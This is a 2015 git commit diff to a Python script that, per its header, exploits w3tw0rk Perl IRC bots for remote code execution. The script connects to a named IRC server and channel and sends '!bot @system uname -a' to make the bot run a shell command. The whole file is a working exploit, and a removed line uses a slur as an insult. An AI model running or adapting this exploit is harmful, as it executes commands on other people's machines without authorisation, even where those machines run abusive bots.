2f427c7783a1973a4ef5ceccb076674b08701d0d
JT <shipcodez@gmail.com>
2015-04-06 14:48:24 +0800

    Update w3tw0rk.py

--- w3tw0rk.py
+++ w3tw0rk.py
@@ -1,29 +1,34 @@
+# w3tw0rk.py
 # w3tw0rk Perl IRC Bot Remote Code Execution
 # author: @shipcod3
 # for taking over a w3tw0rk Perl IRC Bot
 
 import socket
-import os
 import sys
- 
-network = 'chat.freenode.net'
-port = 6667
-channel = "#batibot"
-botOwner = "w3tw0rkhunter" 
-irc = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-irc.connect ( ( network, port ) )
-print irc.recv ( 4096 )
-irc.send ( 'NICK' bot0wner '\r\n' )
-irc.send ( 'USER jjt jjt jjt :just a fskin decoy\r\n' )
-irc.send ( 'JOIN #batibot\r\n' )
-irc.send ( 'PRIVMSG #batibot :!bot @system 'uname -a'r\n' )
-while True:
-   data = irc.recv ( 4096 )
-   if data.find ( 'PING' ) != -1:
-      irc.send ( 'PONG ' + data.split() [ 1 ] + '\r\n' )
-   if data.find ( 'Linux' ) != -1:
-      irc.send ( 'PRIVMSG #batibot :Gay\r\n' )
-   if data.find ( '!quit' ) != -1:
-      irc.send ( 'PRIVMSG #batibot :Fine, if you do not want me\r\n' )
-      irc.send ( 'QUIT\r\n' )
-   print data
+
+#irc server connection settings
+server = "us.dal.net" #irc server
+channel = "#buhaypirata" #channel where the bot is located
+botnick = "botslayer" #admin payload for taking over the w3wt0rk bot
+
+irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
+print "connecting to:"+server
+irc.connect((server, 6667))                                                         #connects to the server
+irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :I eat w3tw0rk bots!\n") #user authentication
+irc.send("NICK "+ botnick +"\n")                            #sets nick
+irc.send("JOIN "+ channel +"\n")        #join the chan
+irc.send("PRIVMSG "+channel+" :!bot @system 'uname -a' \n") #send the payload to the bot
+
+while 1:    #puts it in a loop
+   text=irc.recv(2040)  #receive the text
+   print text   #print text to console
+
+   if text.find('PING') != -1:                          #check if 'PING' is found
+      irc.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
+   if text.find('!quit') != -1:
+      irc.send ("QUIT\r\n")
+      sys.exit()
+   if text.find('Linux') != -1:                         
+      irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
+      irc.send ("QUIT\r\n")
+      sys.exit()
